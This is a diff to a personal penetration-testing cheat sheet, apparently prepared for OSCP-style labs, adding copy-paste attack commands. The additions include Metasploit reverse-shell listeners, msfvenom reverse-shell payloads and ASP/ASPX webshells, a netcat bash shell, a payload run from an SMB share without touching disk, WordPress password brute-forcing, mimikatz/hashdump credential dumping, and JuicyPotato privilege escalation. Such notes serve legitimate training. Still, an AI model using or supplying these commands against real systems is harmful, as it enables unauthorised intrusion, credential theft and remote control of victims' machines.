@@ -382,7 +382,7 @@ shady sites
 Manually 
 
 First time metaploit?
-msfdb init         (initialize database)
+msfdb init         (initialize database)    use msfdv reinit if your instance is messed up and you want to blow it away
 sudo msfconsole -q
 msf > db_rebuild_cache
 msf > [exploit keywords!!!]
@@ -396,12 +396,17 @@ msf > search type:exploits psexec
 Quickly setup a metasploit listener (copy-paste these commands in after changing variables to what you need)
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
-set lhost 192.168.202.9
+set lhost 192.168.119.216
 set lport 443
 set EnableStageEncoding true
 options
 advanced
 run -j
+
+save time:  ## these options will set your variables globally, so you dont have to run them over and over again
+setg LHOST 192.168.119.216
+setg LPORT 443
+
 
 
 SSH:
@@ -450,8 +455,11 @@ get command shell (reverse or bind):
 ./psexec.py [user]:[password]@[10.XX.XX.XX] cmd.exe  (if Windows with SMB is enabled, with creds)
 https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/ 
 
+
 (if Windows, and you can run code on the server in memory from attacking box)
-smbserver
+python smbserver.py tmpshare /tmp                (temporary smb share to host payload)
+(on target)  \\10.11.12.1\tmpshare\met.exe       (run payload without hitting disk)
+
 
 nc -nvlp 4444 xx.xx.xx.xx -e /bin/bash        (cmd.exe on Windows, get linux bash shell)
 
@@ -481,6 +489,9 @@ Use  -u to loop around your list of users (-L), not passwords <-- always use if 
 
 ffuf -w paths.txt -u https://example.net/fuzz
 BurpSuite Intruder suite
+
+wordpress username bruteforce:
+wpscan --url http://10.11.1.251/wp/wp-login.php --usernames wpusers.txt --passwords /usr/share/wordlists/rockyou.txt 
 
 
 
@@ -948,7 +959,7 @@ msfvenom --list payloads
 msfvenom --list encoders
 Windows:
 msfvenom --payload windows/meterpreter/reverse_tcp LHOST=[Your IP Address] LPORT=[Your Port to Connect On] --format exe --out met_win_tcp_reverse.exe
-(try win reverse https)
+(also try win reverse https)
 Linux:
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[Your IP Address] LPORT=[Your Port to Connect On] -f elf > shell.elf
 msfvenom --platform linux -p linux/x86/shell_reverse_tcp LHOST=192.168.253.133 LPORT=443 -f c -b “\x00\x0a\x0d\x20” -e x86/shikata_ga_nai
@@ -956,6 +967,7 @@ Mac:
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=[Your IP Address] LPORT=[Your Port to Connect On] -f macho > shell.macho
 WAR with apache tomcat:
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
+
 
 new msfvenom commands and uses:
 https://forums.offensive-security.com/showthread.php?t=3215 
@@ -979,7 +991,11 @@ Webshells:
 
 ASP
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.136 LPORT=53 -f asp -o shell.asp
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.216 LPORT=443 -f asp -o shell.asp
 ^IIS servers
+
+newer:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.216 LPORT=443 -f aspx -o shell.aspx
 
 PHP
 root@kal:/tmp# msfvenom -p php/meterpreter_reverse_tcp LHOST=10.11.1.229 LPORT=53 -f raw -o shell.php
@@ -1056,20 +1072,27 @@ OSCP post-exp checklists:
 Enumerate as much as you can! Then,
 
 Windows:
+https://guif.re/windowseop
 http://www.fuzzysecurity.com/tutorials/16.html 
+https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
 https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html
 
-https://guif.re/windowseop
+scripts
 https://github.com/pentestmonkey/windows-privesc-check/ 
+https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
 https://github.com/411Hall/JAWS/ 
 -Check net user and admin and user rights
 -Is there powershell? try powerup.ps1, sherlock.ps1 and JAWS.ps1.
--Do you have meterpreter? load kiwi, try bypass UAC, check SAM SYSTEM etc.
+-Do you have meterpreter? migrate to appropriate arch PID and load kiwi (mimikatz older systems) help cmd will show options, try bypass UAC, check SAM SYSTEM etc.
 getsystem
 kiwi – creds_kerberos       creds_all   
 -check for weird programs or non-standard registry keys
+S
 hashdump
 run hashdump
+
+SeImpersonatePrivilege enabled with whoami /all?  Try JuicyPotato.exe (precompiled from offsec has no /DEBUG flag set)
+start c:\inetpub\wwwroot\JuicyPotato.exe -t t -p c:\inetpub\wwwroot\meterpretershell.exe -l 5837
 
 Linux:
 https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ 
